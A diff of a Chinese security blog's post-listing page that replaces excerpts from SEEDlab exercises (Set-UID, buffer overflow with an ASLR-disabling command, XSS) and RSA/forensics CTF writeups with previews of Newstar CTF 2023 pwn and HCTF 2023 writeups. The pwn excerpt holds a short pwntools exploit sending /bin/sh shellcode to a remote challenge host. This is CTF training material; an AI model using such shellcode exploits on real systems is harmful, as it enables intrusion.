@@ -186,91 +186,36 @@
 
 <article class="post-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">SEEDlab—环境变量与 Set-UID 实验
+    <h2 class="entry-hint-parent">Newstar CTF 2023 pwn
     </h2>
   </header>
   <div class="entry-content">
-    <p>Task 1：配置环境变量 使用printenv或env指令来打印环境变量： ​	如果只想打印特定的环境变量，如PWD变量，可以使用printenv PWD或者env | grep PWD
+    <p>1.ezshellcode 直接sendline(shellcode)即可 exp：
+from pwn import * p = remote(&#34;node4.buuoj.cn&#34;,29374) #p = process(&#39;/home/miyu/Desktop/ezshellcode&#39;) context(log_level = &#39;debug&#39;, arch = &#39;amd64&#39;, os = &#39;linux&#39;) shellcode=asm(shellcraft.sh()) #shellcode = b&#39;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&#39; payload = shellcode p.sendlineafter(&#39;Show me your magic\n&#39;,payload) p.interactive() pwntools生成的shellcode和\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05都能过
 ...</p>
   </div>
-  <footer class="entry-footer"><span title='2025-01-12 00:00:00 +0000 UTC'>一月 12, 2025</span>&nbsp;·&nbsp;10 分钟&nbsp;·&nbsp;Mi Yu</footer>
-  <a class="entry-link" aria-label="post link to SEEDlab—环境变量与 Set-UID 实验" href="https://smera1d0.github.io/posts/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8E-set-uid-%E5%AE%9E%E9%AA%8C/"></a>
+  <footer class="entry-footer"><span title='2023-10-17 00:00:00 +0000 UTC'>十月 17, 2023</span>&nbsp;·&nbsp;2 分钟&nbsp;·&nbsp;Mi Yu</footer>
+  <a class="entry-link" aria-label="post link to Newstar CTF 2023 pwn" href="https://smera1d0.github.io/posts/newstar-ctf-2023-pwn/"></a>
 </article>
 
 <article class="post-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">SEEDlab—缓冲区溢出漏洞
+    <h2 class="entry-hint-parent">HCTF 2023 wp
     </h2>
   </header>
   <div class="entry-content">
-    <p>环境设置 关闭反制措施 地址空间布局随机化 地址空间布局随机化：Linux操作系统的使用随机的地址来设置堆栈的起始地址，使得攻击者很难猜测出确切的堆栈起始地址。
-使用命令sudo sysctl -w kernel.randomize_va_space=0来关闭地址空间布局随机化。
-...</p>
+    <p>一、Misc 1.玩原神玩的 分析：附件为一张图片
+观察最后一行，明显有flag的格式
+搜索得知是
+对照得flag为：hctf{yuanlainiyewanyuanshenhhh} ...</p>
   </div>
-  <footer class="entry-footer"><span title='2025-01-12 00:00:00 +0000 UTC'>一月 12, 2025</span>&nbsp;·&nbsp;11 分钟&nbsp;·&nbsp;Mi Yu</footer>
-  <a class="entry-link" aria-label="post link to SEEDlab—缓冲区溢出漏洞" href="https://smera1d0.github.io/posts/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"></a>
-</article>
-
-<article class="post-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">SEEDlab—跨站脚本（XSS）攻击实验
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>Task 1: 上传恶意消息以显示警告窗口 此任务的目标是在 Elgg 的个人资料中嵌入一个 JavaScript 程序，以便当其他用户查看你的个人资料时会执行 JavaScript 程序并显示一个警告窗口。
-1. 直接嵌入 以下的 JavaScript 代码将显示一个警告窗口：
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2025-01-12 00:00:00 +0000 UTC'>一月 12, 2025</span>&nbsp;·&nbsp;9 分钟&nbsp;·&nbsp;Mi Yu</footer>
-  <a class="entry-link" aria-label="post link to SEEDlab—跨站脚本（XSS）攻击实验" href="https://smera1d0.github.io/posts/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACxss%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/"></a>
-</article>
-
-<article class="post-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">操作系统基础
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>进程 概念 动态的，程序的一次执行过程，同一个程序多次执行会对应多个进程
-当进程被创建时，操作系统会为该进程分配一个唯一的不重复的PID号
-进程的组成 进程控制块PCB 操作系统会记录PID、进程所属用户、分配资源的情况、进程的运行情况，保存在PCB（进程控制块）中。
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2024-06-04 00:00:00 +0000 UTC'>六月 4, 2024</span>&nbsp;·&nbsp;11 分钟&nbsp;·&nbsp;Mi Yu</footer>
-  <a class="entry-link" aria-label="post link to 操作系统基础" href="https://smera1d0.github.io/posts/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"></a>
-</article>
-
-<article class="post-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">2024 盘古石数据取证 服务器部分wp
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>1. 分析内部IM服务器检材，在搭建的内部即时通讯平台中，客户端与服务器的通讯端口是：[答案格式：8888][★☆☆☆☆] 8065 2. 分析内部IM服务器检材，该内部IM平台使用的数据库版本是： [答案格式：12.34][★★☆☆☆] 使用docker inspect 64
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2024-05-14 00:00:00 +0000 UTC'>五月 14, 2024</span>&nbsp;·&nbsp;2 分钟&nbsp;·&nbsp;Mi Yu</footer>
-  <a class="entry-link" aria-label="post link to 2024 盘古石数据取证 服务器部分wp" href="https://smera1d0.github.io/posts/2024-%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81-%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E5%88%86wp/"></a>
-</article>
-
-<article class="post-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">CTF RSA 合集
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>e很小时： import gmpy2 from functools import reduce from Crypto.Util.number import long_to_bytes def CRT(items): N = reduce(lambda x, y: x * y, (i[1] for i in items)) result = 0 for a, n in items: m = N // n d, r, s = gmpy2.gcdext(n, m) if d != 1: raise Exception(&#34;Input not pairwise co-prime&#34;) result &#43;= a * s * m return result % N, N # e, n, c e = 0x3 n=[0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793] c=[0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365] data = list(zip(c, n)) x, n = CRT(data) m = gmpy2.iroot(gmpy2.mpz(x), e)[0].digits() print(m) print(long_to_bytes(int(m)).decode()) 解形如$x^2(modp)\equiv r$的同余方程 V&amp;N2020 公开赛 easy_RSA from random import randint from gmpy2 import * from Crypto.Util.number import * def getprime(bits): while 1: n = 1 while n.bit_length() &lt; bits: n *= next_prime(randint(1,1000)) if isPrime(n - 1): return n - 1 m = bytes_to_long(b&#39;flag{************************************}&#39;) p = getprime(505) q = getPrime(512) r = getPrime(512) assert m &lt; q n = p * q * r e = 0x10001 d = invert(q ** 2, p ** 2) c = pow(m, 2, r) cipher = pow(c, e, n) print(n) print(d) print(cipher) &#39;&#39;&#39; 7941371739956577280160664419383740967516918938781306610817149744988379280561359039016508679365806108722198157199058807892703837558280678711420411242914059658055366348123106473335186505617418956630780649894945233345985279471106888635177256011468979083320605103256178446993230320443790240285158260236926519042413378204298514714890725325831769281505530787739922007367026883959544239568886349070557272869042275528961483412544495589811933856131557221673534170105409 7515987842794170949444517202158067021118454558360145030399453487603693522695746732547224100845570119375977629070702308991221388721952258969752305904378724402002545947182529859604584400048983091861594720299791743887521228492714135449584003054386457751933095902983841246048952155097668245322664318518861440 1618155233923718966393124032999431934705026408748451436388483012584983753140040289666712916510617403356206112730613485227084128314043665913357106301736817062412927135716281544348612150328867226515184078966397180771624148797528036548243343316501503364783092550480439749404301122277056732857399413805293899249313045684662146333448668209567898831091274930053147799756622844119463942087160062353526056879436998061803187343431081504474584816590199768034450005448200 &#39;&#39;&#39; c = pow(m, 2, r)
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2024-05-14 00:00:00 +0000 UTC'>五月 14, 2024</span>&nbsp;·&nbsp;3 分钟&nbsp;·&nbsp;Mi Yu</footer>
-  <a class="entry-link" aria-label="post link to CTF RSA 合集" href="https://smera1d0.github.io/posts/ctf-rsa-%E5%90%88%E9%9B%86/"></a>
+  <footer class="entry-footer"><span title='2023-09-12 00:00:00 +0000 UTC'>九月 12, 2023</span>&nbsp;·&nbsp;6 分钟&nbsp;·&nbsp;Mi Yu</footer>
+  <a class="entry-link" aria-label="post link to HCTF 2023 wp" href="https://smera1d0.github.io/posts/hctf-2023-wp/"></a>
 </article>
 <footer class="page-footer">
   <nav class="pagination">
     <a class="prev" href="https://smera1d0.github.io/page/2/">
-      «&nbsp;上一页&nbsp;2/4
-    </a>
-    <a class="next" href="https://smera1d0.github.io/page/4/">下一页&nbsp;4/4&nbsp;»
+      «&nbsp;上一页&nbsp;2/3
     </a>
   </nav>
 </footer>
